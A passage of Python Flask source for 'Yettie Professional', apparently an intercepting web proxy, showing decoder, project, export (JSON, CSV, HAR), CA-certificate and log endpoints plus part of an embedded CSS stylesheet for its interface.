                result = processor.xor(input_data, key).hex()
            elif operation == 'md5':
                result = processor.calculate_hash(input_data, 'md5')
            elif operation == 'sha1':
                result = processor.calculate_hash(input_data, 'sha1')
            elif operation == 'sha256':
                result = processor.calculate_hash(input_data, 'sha256')
            elif operation == 'sha512':
                result = processor.calculate_hash(input_data, 'sha512')
            elif operation == 'json_beautify':
                result = processor.json_beautify(input_data)
            elif operation == 'json_minify':
                result = processor.json_minify(input_data)
            elif operation == 'xml_beautify':
                result = processor.xml_beautify(input_data)
            elif operation == 'gzip_compress':
                result = processor.gzip_compress(input_data)
            elif operation == 'gzip_decompress':
                result = processor.gzip_decompress(input_data)
            elif operation == 'jwt_decode':
                result = json.dumps(processor.jwt_decode(input_data), indent=2)
            elif operation == 'extract_emails':
                result = '\n'.join(processor.extract_emails(input_data))
            elif operation == 'extract_urls':
                result = '\n'.join(processor.extract_urls(input_data))
            elif operation == 'extract_ips':
                result = '\n'.join(processor.extract_ips(input_data))
            elif operation == 'extract_hashes':
                hashes_data = processor.extract_hashes(input_data)
                result = json.dumps(hashes_data, indent=2)
            elif operation == 'generate_password':
                length = int(data.get('length', 16))
                complexity = int(data.get('complexity', 3))
                result = processor.generate_password(length, complexity)
            else:
                error = f'Unknown operation: {operation}'

        except Exception as e:
            error = str(e)

        return jsonify({
            'result': result,
            'error': error
        })

    except Exception as e:
        logger.error(f"Error in decoder: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/projects')
def api_projects():
    """Get projects list"""
    try:
        conn = db_manager.get_connection()
        cursor = conn.cursor()

        cursor.execute("""
            SELECT id, name, description, created, modified, status, stats
            FROM projects 
            ORDER BY datetime(created) DESC
        """)

        rows = cursor.fetchall()

        projects = []
        for row in rows:
            stats = json.loads(row[6]) if row[6] else {}
            projects.append({
                'id': row[0],
                'name': row[1],
                'description': row[2] or '',
                'created': row[3],
                'modified': row[4],
                'status': row[5],
                'stats': stats
            })

        return jsonify(projects)

    except Exception as e:
        logger.error(f"Error getting projects: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/projects', methods=['POST'])
def api_projects_create():
    """Create project"""
    try:
        data = request.json
        name = data.get('name')
        description = data.get('description', '')

        if not name:
            return jsonify({'error': 'Project name required'}), 400

        project_id = str(uuid.uuid4())

        conn = db_manager.get_connection()
        cursor = conn.cursor()

        cursor.execute("""
            INSERT INTO projects (id, name, description, created, modified, status)
            VALUES (?,?,?,?,?,?)
        """, (
            project_id,
            name,
            description,
            datetime.now(timezone.utc).isoformat(),
            datetime.now(timezone.utc).isoformat(),
            'active'
        ))

        conn.commit()

        return jsonify({
            'success': True,
            'project_id': project_id,
            'message': 'Project created'
        })

    except Exception as e:
        logger.error(f"Error creating project: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/export/<format_type>')
def api_export(format_type):
    """Export data"""
    try:
        project_id = request.args.get('project', 'default')

        if format_type == 'json':
            conn = db_manager.get_connection()
            cursor = conn.cursor()

            cursor.execute("""
                SELECT method, scheme, host, port, path, query,
                       response_code, timestamp, request_size, response_size
                FROM requests 
                WHERE project_id = ?
            """, (project_id,))

            rows = cursor.fetchall()

            data = []
            for row in rows:
                data.append({
                    'method': row[0],
                    'url': f"{row[1]}://{row[2]}:{row[3]}{row[4]}{'?' + row[5] if row[5] else ''}",
                    'status': row[6],
                    'timestamp': row[7],
                    'request_size': row[8],
                    'response_size': row[9]
                })

            return jsonify(data)

        elif format_type == 'csv':
            conn = db_manager.get_connection()
            cursor = conn.cursor()

            cursor.execute("""
                SELECT timestamp, method, scheme, host, port, path,
                       response_code, request_size, response_size
                FROM requests 
                WHERE project_id = ?
            """, (project_id,))

            rows = cursor.fetchall()

            output = StringIO()
            writer = csv.writer(output)
            writer.writerow(
                ['Timestamp', 'Method', 'Scheme', 'Host', 'Port', 'Path', 'Status', 'Req Size', 'Resp Size'])

            for row in rows:
                writer.writerow([row[0], row[1], row[2], row[3], row[4], row[5], row[6], row[7], row[8]])

            return Response(
                output.getvalue(),
                mimetype='text/csv',
                headers={'Content-Disposition': f'attachment; filename=yettie_export_{project_id}.csv'}
            )

        elif format_type == 'har':
            # Generate HAR (HTTP Archive) format
            conn = db_manager.get_connection()
            cursor = conn.cursor()

            cursor.execute("""
                SELECT timestamp, method, scheme, host, port, path, query,
                       headers, body, response_code, response_headers, response_body
                FROM requests 
                WHERE project_id = ?
                ORDER BY datetime(timestamp)
            """, (project_id,))

            rows = cursor.fetchall()

            har = {
                'log': {
                    'version': '1.2',
                    'creator': {
                        'name': 'Yettie Professional',
                        'version': '3.0'
                    },
                    'entries': []
                }
            }

            for row in rows:
                entry = {
                    'startedDateTime': row[0],
                    'time': 100,  # Placeholder
                    'request': {
                        'method': row[1],
                        'url': f"{row[2]}://{row[3]}:{row[4]}{row[5]}{'?' + row[6] if row[6] else ''}",
                        'httpVersion': 'HTTP/1.1',
                        'headers': [],
                        'queryString': [],
                        'postData': {},
                        'headersSize': -1,
                        'bodySize': -1
                    },
                    'response': {
                        'status': row[9],
                        'statusText': 'OK' if row[9] == 200 else 'Not Found',
                        'httpVersion': 'HTTP/1.1',
                        'headers': [],
                        'content': {
                            'size': len(row[11]) if row[11] else 0,
                            'mimeType': 'text/html',
                            'text': base64.b64encode(row[11]).decode() if row[11] else ''
                        },
                        'redirectURL': '',
                        'headersSize': -1,
                        'bodySize': -1
                    },
                    'cache': {},
                    'timings': {
                        'send': 0,
                        'wait': 100,
                        'receive': 0
                    }
                }

                # Parse headers
                if row[7]:
                    headers = json.loads(row[7])
                    for key, value in headers:
                        entry['request']['headers'].append({
                            'name': key,
                            'value': value
                        })

                if row[10]:
                    headers = json.loads(row[10])
                    for key, value in headers:
                        entry['response']['headers'].append({
                            'name': key,
                            'value': value
                        })

                # Parse query string
                if row[6]:
                    from urllib.parse import parse_qs
                    params = parse_qs(row[6])
                    for key, values in params.items():
                        for value in values:
                            entry['request']['queryString'].append({
                                'name': key,
                                'value': value
                            })

                # Add post data if present
                if row[8] and row[1].upper() in ['POST', 'PUT', 'PATCH']:
                    entry['request']['postData'] = {
                        'mimeType': 'application/x-www-form-urlencoded',
                        'text': row[8].decode('utf-8', errors='ignore'),
                        'params': []
                    }

                har['log']['entries'].append(entry)

            return jsonify(har)

        else:
            return jsonify({'error': 'Unsupported format'}), 400

    except Exception as e:
        logger.error(f"Error exporting data: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/ca/certificate')
def api_ca_certificate():
    """Get CA certificate"""
    try:
        cert_pem = ca.get_ca_cert_pem()
        return Response(
            cert_pem,
            mimetype='application/x-x509-ca-cert',
            headers={'Content-Disposition': 'attachment; filename=yettie_ca.crt'}
        )
    except Exception as e:
        logger.error(f"Error getting CA certificate: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/logs')
def api_logs():
    """Get system logs"""
    try:
        log_type = request.args.get('type', 'system')
        limit = int(request.args.get('limit', 100))

        if log_type == 'audit':
            conn = sqlite3.connect(f"{Config.LOGS_DIR}/audit.db")
            cursor = conn.cursor()

            cursor.execute("""
                SELECT timestamp, level, module, user, ip_address, action, details
                FROM audit_logs 
                ORDER BY datetime(timestamp) DESC
                LIMIT ?
            """, (limit,))

            rows = cursor.fetchall()
            conn.close()

            logs = []
            for row in rows:
                logs.append({
                    'timestamp': row[0],
                    'level': row[1],
                    'module': row[2],
                    'user': row[3],
                    'ip_address': row[4],
                    'action': row[5],
                    'details': row[6]
                })
        else:
            # Read from log file
            log_file = f"{Config.LOGS_DIR}/yettie.log"
            if os.path.exists(log_file):
                with open(log_file, 'r') as f:
                    lines = f.readlines()[-limit:]
                logs = [{'line': line.strip()} for line in lines]
            else:
                logs = []

        return jsonify(logs)

    except Exception as e:
        logger.error(f"Error getting logs: {e}")
        return jsonify({'error': str(e)}), 500


# =================================================================
# ADVANCED UI TEMPLATE
# =================================================================

# Due to length constraints, the complete UI template is provided separately


ADVANCED_UI_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yettie Professional v3.0 - Advanced Security Testing Platform</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <style>
        /* ============================================
           RESET & BASE STYLES
           ============================================ */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            /* Color Palette - Light Theme */
            --primary-color: #4a6ee0;
            --primary-dark: #3a5acf;
            --primary-light: #6c8aee;
            --primary-bg: #f0f4ff;

            --secondary-color: #6c757d;
            --secondary-dark: #545b62;
            --secondary-light: #868e96;

            --success-color: #28a745;
            --warning-color: #ffc107;
            --danger-color: #dc3545;
            --info-color: #17a2b8;

            /* UI Colors */
            --bg-primary: #ffffff;
            --bg-secondary: #f8f9fa;
            --bg-tertiary: #e9ecef;
            --bg-card: #ffffff;

            --text-primary: #212529;
            --text-secondary: #6c757d;
            --text-tertiary: #868e96;
            --text-muted: #adb5bd;

            --border-color: #dee2e6;
            --border-light: #e9ecef;
            --border-dark: #ced4da;

            /* Shadows */
            --shadow-sm: 0 1px 3px rgba(0,0,0,0.12);
            --shadow-md: 0 4px 6px rgba(0,0,0,0.1);
            --shadow-lg: 0 10px 25px rgba(0,0,0,0.15);
            --shadow-xl: 0 20px 40px rgba(0,0,0,0.2);

            /* Transitions */
            --transition-fast: 150ms ease;
            --transition-normal: 250ms ease;
            --transition-slow: 350ms ease;

            /* Spacing */
            --spacing-xs: 0.25rem;
            --spacing-sm: 0.5rem;
            --spacing-md: 1rem;
            --spacing-lg: 1.5rem;
            --spacing-xl: 2rem;
            --spacing-xxl: 3rem;

            /* Border Radius */
            --radius-sm: 4px;
            --radius-md: 8px;
            --radius-lg: 12px;
            --radius-xl: 16px;
            --radius-round: 9999px;

            /* Typography */
            --font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            --font-size-xs: 0.75rem;
            --font-size-sm: 0.875rem;
            --font-size-md: 1rem;
            --font-size-lg: 1.125rem;
            --font-size-xl: 1.25rem;
            --font-size-xxl: 1.5rem;
            --font-size-xxxl: 2rem;

            /* Layout */
            --sidebar-width: 280px;
            --sidebar-width-collapsed: 70px;
            --topbar-height: 60px;
        }

        body {
            font-family: var(--font-family);
            font-size: var(--font-size-md);
            line-height: 1.5;
            color: var(--text-primary);
            background: linear-gradient(135deg, #ffffff 0%, #E3DBDA 100%);
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* ============================================
           LAYOUT COMPONENTS
           ============================================ */
        .app-container {
            display: flex;
            min-height: 100vh;
            background: var(--bg-primary);
            border-radius: var(--radius-lg);
            overflow: hidden;
            box-shadow: var(--shadow-xl);
            margin: 1rem;
        }

        /* Sidebar */
        .sidebar {
            width: var(--sidebar-width);
            background: linear-gradient(180deg, #2c3e50 0%, #1a252f 100%);
            color: white;
            display: flex;
            flex-direction: column;
            transition: width var(--transition-normal);
            overflow: hidden;
            z-index: 100;
        }

        .sidebar.collapsed {
            width: var(--sidebar-width-collapsed);
        }

        .logo {
            padding: var(--spacing-lg);
            border-bottom: 1px solid rgba(255,255,255,0.1);
            display: flex;
            align-items: center;
            gap: var(--spacing-md);
        }

        .logo-icon {
            font-size: 24px;
            color: var(--primary-light);
        }

        .logo-text {
            font-size: var(--font-size-xl);
            font-weight: 700;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .sidebar.collapsed .logo-text {
            display: none;
        }
        
        
        
        
        
        .progress-wrapper {
            width: 100%;
            height: 10px;
            background: #eee;
            border-radius: 5px;
            overflow: hidden;
        }

        .progress-bar {
            height: 100%;
            width: 0%;
            background: #4caf50;
            transition: width 0.3s ease;
        }


        .nav-section {
            padding: var(--spacing-lg) 0;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }

        .nav-title {
            padding: 0 var(--spacing-lg) var(--spacing-sm);
            color: rgba(255,255,255,0.6);
            font-size: var(--font-size-xs);
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .sidebar.collapsed .nav-title {
            display: none;
        }

        .nav-item {
            display: flex;
            align-items: center;
            gap: var(--spacing-md);
            padding: var(--spacing-md) var(--spacing-lg);
            color: rgba(255,255,255,0.8);
            text-decoration: none;
            transition: all var(--transition-fast);
            cursor: pointer;
            border-left: 3px solid transparent;
        }

        .nav-item:hover {
            background: rgba(255,255,255,0.1);
            color: white;
            border-left-color: var(--primary-color);
        }

        .nav-item.active {
            background: rgba(74, 110, 224, 0.2);
            color: white;
            border-left-color: var(--primary-color);
        }

        .nav-item i {
            width: 20px;
            text-align: center;
            font-size: 16px;
        }

        .sidebar.collapsed .nav-item span {
            display: none;
        }

        .sidebar-toggle {
            position: absolute;
            bottom: var(--spacing-lg);
            right: var(--spacing-md);
            background: rgba(255,255,255,0.1);
            border: none;
            color: white;
            width: 32px;
            height: 32px;
            border-radius: var(--radius-round);
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all var(--transition-fast);
        }

        .sidebar-toggle:hover {
            background: rgba(255,255,255,0.2);
        }

        /* Main Content */
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        .top-bar {
            height: var(--topbar-height);
            background: var(--bg-primary);
            border-bottom: 1px solid var(--border-color);
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 var(--spacing-lg);
            box-shadow: var(--shadow-sm);
        }

        .top-bar-left, .top-bar-right {
            display: flex;
            align-items: center;
            gap: var(--spacing-md);
        }

        .status-badge {
            padding: var(--spacing-xs) var(--spacing-md);
            background: var(--success-color);
            color: white;
            border-radius: var(--radius-round);
            font-size: var(--font-size-xs);
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: var(--spacing-xs);
        }

        .status-badge.danger { background: var(--danger-color); }
        .status-badge.warning { background: var(--warning-color); color: var(--text-primary); }
        .status-badge.info { background: var(--info-color); }

        .content-area {
            flex: 1;
            padding: var(--spacing-lg);
            overflow-y: auto;
            background: var(--bg-secondary);
        }
        
        
        
        /*===================================
        Tree
        =====================================*/
        .tree {
                font-family: var(--font-family);
            }
            
            .tree-host {
                margin-bottom: 8px;
            }
            
            .tree-host-header {
                padding: 8px 12px;
                background: var(--bg-tertiary);
                border-radius: var(--radius-md);
                cursor: pointer;
                display: flex;
                align-items: center;
                gap: 8px;
                font-weight: 600;
                transition: background var(--transition-fast);
            }
            
            .tree-host-header:hover {
                background: var(--border-color);
            }
            
            .tree-host-content {
                padding-left: 20px;
                margin-top: 4px;
            }
            
            .tree-item {
                padding: 6px 8px;
                margin: 2px 0;
                border-radius: var(--radius-sm);
                cursor: pointer;
                display: flex;
                align-items: center;
                gap: 8px;
                transition: background var(--transition-fast);
            }
            
            .tree-item:hover {
                background: var(--primary-bg);
            }
            
            .tree-url {
                flex: 1;
                font-family: 'Monaco', 'Menlo', monospace;
                font-size: var(--font-size-sm);
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap;
            }
            
            .tree-count {
                font-size: var(--font-size-xs);
                color: var(--text-muted);
                margin-left: auto;
            }

        /* ============================================
           BUTTONS
           ============================================ */
        .btn {
            padding: var(--spacing-sm) var(--spacing-md);
            border: none;
            border-radius: var(--radius-md);
            font-size: var(--font-size-sm);
            font-weight: 500;
            cursor: pointer;
            transition: all var(--transition-fast);
            display: inline-flex;
            align-items: center;
            gap: var(--spacing-sm);
            text-decoration: none;
            justify-content: center;
            margin: 8px;
        }

        .btn-primary {
            background: var(--primary-color);
            color: white;
        }

        .btn-primary:hover {
            background: var(--primary-dark);
            transform: translateY(-1px);
            box-shadow: var(--shadow-md);
        }

        .btn-secondary {
            background: var(--bg-tertiary);
            color: var(--text-secondary);
        }

        .btn-secondary:hover {
            background: var(--border-color);
        }

        .btn-success {
            background: var(--success-color);
            color: white;
        }

        .btn-danger {
            background: var(--danger-color);
            color: white;
        }

        .btn-warning {
            background: var(--warning-color);
            color: var(--text-primary);
        }

        .btn-sm {
            padding: var(--spacing-xs) var(--spacing-sm);
            font-size: var(--font-size-xs);
        }

        .btn-lg {
            padding: var(--spacing-md) var(--spacing-lg);
            font-size: var(--font-size-md);
        }

        .btn-icon {
            width: 36px;
            height: 36px;
            padding: 0;
            justify-content: center;
            display: inline-flex;
            align-items: center;
        }

        /* ============================================
           CARDS & PANELS
           ============================================ */
        .card {
            background: var(--bg-card);
            border-radius: var(--radius-lg);
            padding: var(--spacing-lg);
            margin-bottom: var(--spacing-lg);
            box-shadow: var(--shadow-sm);
            border: 1px solid var(--border-color);
            transition: all var(--transition-normal);
        }

        .card:hover {
            box-shadow: var(--shadow-md);
            transform: translateY(-2px);
        }

        .card-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: var(--spacing-md);
            padding-bottom: var(--spacing-sm);
            border-bottom: 1px solid var(--border-light);
        }

        .card-title {
            font-size: var(--font-size-lg);
            font-weight: 600;
            color: var(--text-primary);
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
        }

        .card-body {
            padding: var(--spacing-md) 0;
        }

        .panel {
            background: var(--bg-card);
            border-radius: var(--radius-md);
            border: 1px solid var(--border-color);
            overflow: hidden;
        }

        .panel-header {
            padding: var(--spacing-md) var(--spacing-lg);
            background: var(--bg-tertiary);
            border-bottom: 1px solid var(--border-color);
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .panel-body {
            padding: var(--spacing-lg);
        }

        /* ============================================
           DASHBOARD COMPONENTS
           ============================================ */
        .dashboard-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: var(--spacing-lg);
            margin-bottom: var(--spacing-xl);
        }

        .stat-card {
            background: linear-gradient(135deg, var(--primary-color) 0%, var(--primary-dark) 100%);
            color: white;
            padding: var(--spacing-lg);
            border-radius: var(--radius-lg);
            display: flex;
            align-items: center;
            gap: var(--spacing-lg);
            box-shadow: var(--shadow-md);
        }

        .stat-icon {
            width: 60px;
            height: 60px;
            border-radius: var(--radius-lg);
            background: rgba(255,255,255,0.2);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }

        .stat-content {
            flex: 1;
        }

        .stat-value {
            font-size: var(--font-size-xxl);
            font-weight: 700;
            margin-bottom: var(--spacing-xs);
        }

        .stat-label {
            font-size: var(--font-size-sm);
            opacity: 0.9;
        }

        .chart-container {
            background: var(--bg-card);
            border-radius: var(--radius-lg);
            padding: var(--spacing-lg);
            margin-bottom: var(--spacing-lg);
            box-shadow: var(--shadow-sm);
            position: relative;
        }
        
        /* Line chart */
        .chart-container.line-chart {
            height: 300px;
        }

        /* Doughnut chart */
        .chart-container.doughnut-chart {
            height: 300px;
            max-height: 340px;
            display: flex;
            flex-direction: column;
        }

        /* Force canvas to behave */
        .chart-container.doughnut-chart canvas {
            flex: 1;
            max-height: 200px;
        }

        .chart-title {
            font-size: var(--font-size-lg);
            font-weight: 600;
            margin-bottom: var(--spacing-lg);
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
        }

        /* ============================================
           REQUEST LIST COMPONENTS
           ============================================ */
        .request-list {
            background: var(--bg-card);
            border-radius: var(--radius-lg);
            overflow: hidden;
            box-shadow: var(--shadow-sm);
        }

        .list-header {
            padding: var(--spacing-md) var(--spacing-lg);
            background: var(--bg-tertiary);
            border-bottom: 1px solid var(--border-color);
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .list-title {
            font-size: var(--font-size-lg);
            font-weight: 600;
        }

        .list-filters {
            display: flex;
            align-items: center;
            gap: var(--spacing-md);
        }

        .request-item {
            padding: var(--spacing-md) var(--spacing-lg);
            border-bottom: 1px solid var(--border-light);
            display: flex;
            align-items: center;
            gap: var(--spacing-md);
            transition: all var(--transition-fast);
            cursor: pointer;
        }

        .request-item:hover {
            background: var(--primary-bg);
        }

        .request-item.selected {
            background: var(--primary-bg);
            border-left: 3px solid var(--primary-color);
        }

        .method-badge {
            padding: var(--spacing-xs) var(--spacing-sm);
            border-radius: var(--radius-sm);
            font-size: var(--font-size-xs);
            font-weight: 600;
            text-transform: uppercase;
            min-width: 60px;
            text-align: center;
        }

        .method-badge.get { background: #d1ecf1; color: #0c5460; }
        .method-badge.post { background: #d4edda; color: #155724; }
        .method-badge.put { background: #fff3cd; color: #856404; }
        .method-badge.delete { background: #f8d7da; color: #721c24; }
        .method-badge.patch { background: #cce5ff; color: #004085; }
        .method-badge.head { background: #e2e3e5; color: #383d41; }
        .method-badge.options { background: #d6d8db; color: #212529; }

        .request-details {
            flex: 1;
            min-width: 0;
        }

        .request-url {
            font-size: var(--font-size-sm);
            color: var(--text-primary);
            margin-bottom: var(--spacing-xs);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .request-meta {
            display: flex;
            align-items: center;
            gap: var(--spacing-md);
            font-size: var(--font-size-xs);
            color: var(--text-secondary);
        }

        .status-code {
            font-weight: 600;
        }

        .status-code.success { color: var(--success-color); }
        .status-code.error { color: var(--danger-color); }
        .status-code.warning { color: var(--warning-color); }

        .request-actions {
            display: flex;
            gap: var(--spacing-xs);
            opacity: 0;
            transition: opacity var(--transition-fast);
        }

        .request-item:hover .request-actions {
            opacity: 1;
        }

        /* ============================================
           FORM COMPONENTS
           ============================================ */
        .form-group {
            margin-bottom: var(--spacing-lg);
        }

        .form-label {
            display: block;
            margin-bottom: var(--spacing-sm);
            font-weight: 500;
            color: var(--text-primary);
        }

        .form-control {
            width: 100%;
            padding: var(--spacing-sm) var(--spacing-md);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-md);
            font-size: var(--font-size-md);
            font-family: var(--font-family);
            transition: all var(--transition-fast);
        }

        .form-control:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(74, 110, 224, 0.1);
        }

        .form-textarea {
            min-height: 120px;
            resize: vertical;
            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
            font-size: var(--font-size-sm);
        }

        .form-select {
            appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' fill='currentColor' class='bi bi-chevron-down' viewBox='0 0 16 16'%3E%3Cpath fill-rule='evenodd' d='M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z'/%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 12px center;
            background-size: 16px;
            padding-right: 40px;
        }

        .form-check {
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
            margin-bottom: var(--spacing-sm);
        }

        .form-check-input {
            width: 18px;
            height: 18px;
        }

        /* ============================================
           TABS
           ============================================ */
        .tabs {
            display: flex;
            border-bottom: 1px solid var(--border-color);
            margin-bottom: var(--spacing-lg);
            overflow-x: auto;
        }

        .tab {
            padding: var(--spacing-md) var(--spacing-lg);
            border: none;
            background: none;
            color: var(--text-secondary);
            font-size: var(--font-size-sm);
            font-weight: 500;
            cursor: pointer;
            transition: all var(--transition-fast);
            border-bottom: 2px solid transparent;
            white-space: nowrap;
        }

        .tab:hover {
            color: var(--primary-color);
        }

        .tab.active {
            color: var(--primary-color);
            border-bottom-color: var(--primary-color);
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        /* ============================================
           MODALS
           ============================================ */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.5);
            z-index: 1050;
            align-items: center;
            justify-content: center;
            padding: var(--spacing-lg);
        }

        .modal.show {
            display: flex;
        }

        .modal-content {
            background: var(--bg-primary);
            border-radius: var(--radius-lg);
            width: 100%;
            max-width: 800px;
            max-height: 90vh;
            overflow: hidden;
            box-shadow: var(--shadow-xl);
        }

        .modal-header {
            padding: var(--spacing-lg);
            border-bottom: 1px solid var(--border-color);
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .modal-title {
            font-size: var(--font-size-xl);
            font-weight: 600;
        }

        .modal-close {
            background: none;
            border: none;
            font-size: 24px;
            color: var(--text-secondary);
            cursor: pointer;
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: var(--radius-round);
            transition: all var(--transition-fast);
        }

        .modal-close:hover {
            background: var(--bg-tertiary);
            color: var(--danger-color);
        }

        .modal-body {
            padding: var(--spacing-lg);
            max-height: 60vh;
            overflow-y: auto;
        }

        .modal-footer {
            padding: var(--spacing-lg);
            border-top: 1px solid var(--border-color);
            display: flex;
            justify-content: flex-end;
            gap: var(--spacing-md);
        }

        /* ============================================
           CODE EDITOR
           ============================================ */
        .code-editor {
            background: #1e1e1e;
            color: #d4d4d4;
            border-radius: var(--radius-md);
            overflow: hidden;
            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
        }

        .code-toolbar {
            padding: var(--spacing-md);
            background: #252525;
            border-bottom: 1px solid #333;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .code-content {
            padding: var(--spacing-md);
            max-height: 400px;
            overflow-y: auto;
        }

        .code-line {
            margin-bottom: var(--spacing-xs);
            font-size: var(--font-size-sm);
            line-height: 1.5;
            white-space: pre;
        }

        .code-line.highlight {
            background: rgba(255, 255, 0, 0.1);
        }

        /* ============================================
           SEVERITY BADGES
           ============================================ */
        .severity-badge {
            padding: var(--spacing-xs) var(--spacing-sm);
            border-radius: var(--radius-sm);
            font-size: var(--font-size-xs);
            font-weight: 600;
            text-transform: uppercase;
        }

        .severity-critical {
            background: linear-gradient(135deg, #721c24 0%, #bd2130 100%);
            color: white;
        }

        .severity-high {
            background: linear-gradient(135deg, #856404 0%, #d39e00 100%);
            color: white;
        }

        .severity-medium {
            background: linear-gradient(135deg, #0c5460 0%, #117a8b 100%);
            color: white;
        }

        .severity-low {
            background: linear-gradient(135deg, #155724 0%, #28a745 100%);
            color: white;
        }

        .severity-info {
            background: linear-gradient(135deg, #004085 0%, #0069d9 100%);
            color: white;
        }

        /* ============================================
           LOADING & EMPTY STATES
           ============================================ */
        .loading {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: var(--spacing-xxl);
            color: var(--text-secondary);
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid var(--border-color);
            border-top-color: var(--primary-color);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: var(--spacing-md);
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .empty-state {
            text-align: center;
            padding: var(--spacing-xxl);
            color: var(--text-secondary);
        }

        .empty-state i {
            font-size: 48px;
            margin-bottom: var(--spacing-md);
            color: var(--border-color);
        }

        /* ============================================
           RESPONSIVE DESIGN
           ============================================ */
        @media (max-width: 1200px) {
            .sidebar {
                width: var(--sidebar-width-collapsed);
            }

            .sidebar:not(.collapsed) {
                width: var(--sidebar-width);
            }

            .dashboard-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }

        @media (max-width: 768px) {
            .app-container {
                margin: 0;
                border-radius: 0;
            }

            .sidebar {
                position: fixed;
                left: -280px;
                top: 0;
                bottom: 0;
                z-index: 1000;
            }

            .sidebar.show {
                left: 0;
            }

            .dashboard-grid {
                grid-template-columns: 1fr;
            }

            .top-bar-left, .top-bar-right {
                flex-wrap: wrap;
            }

            .list-filters {
                flex-wrap: wrap;
            }
        }

        @media (max-width: 576px) {
            .content-area {
                padding: var(--spacing-md);
            }

            .card {
                padding: var(--spacing-md);
            }

            .modal-content {
                margin: var(--spacing-md);
            }
        }

        /* ============================================
           UTILITY CLASSES
           ============================================ */
        .d-none { display: none !important; }
        .d-flex { display: flex !important; }
        .d-block { display: block !important; }
        .d-inline { display: inline !important; }
        .d-inline-block { display: inline-block !important; }

        .flex-column { flex-direction: column; }
        .flex-row { flex-direction: row; }
        .flex-wrap { flex-wrap: wrap; }
        .flex-nowrap { flex-wrap: nowrap; }

        .justify-start { justify-content: flex-start; }
        .justify-end { justify-content: flex-end; }
        .justify-center { justify-content: center; }
        .justify-between { justify-content: space-between; }
        .justify-around { justify-content: space-around; }

        .align-start { align-items: flex-start; }
        .align-end { align-items: flex-end; }
        .align-center { align-items: center; }
        .align-baseline { align-items: baseline; }
        .align-stretch { align-items: stretch; }

        .text-left { text-align: left; }
        .text-center { text-align: center; }
        .text-right { text-align: right; }
        .text-justify { text-align: justify; }

        .text-primary { color: var(--primary-color) !important; }
        .text-success { color: var(--success-color) !important; }
        .text-danger { color: var(--danger-color) !important; }
        .text-warning { color: var(--warning-color) !important; }
        .text-info { color: var(--info-color) !important; }
        .text-muted { color: var(--text-muted) !important; }

        .bg-primary { background-color: var(--primary-color) !important; }
        .bg-success { background-color: var(--success-color) !important; }
        .bg-danger { background-color: var(--danger-color) !important; }
        .bg-warning { background-color: var(--warning-color) !important; }
        .bg-info { background-color: var(--info-color) !important; }
        .bg-light { background-color: var(--bg-tertiary) !important; }
        .bg-dark { background-color: var(--text-primary) !important; }

        .w-100 { width: 100% !important; }
        .h-100 { height: 100% !important; }
        .mw-100 { max-width: 100% !important; }
        .mh-100 { max-height: 100% !important; }

        .m-0 { margin: 0 !important; }
        .m-1 { margin: var(--spacing-xs) !important; }
        .m-2 { margin: var(--spacing-sm) !important; }
        .m-3 { margin: var(--spacing-md) !important; }
        .m-4 { margin: var(--spacing-lg) !important; }
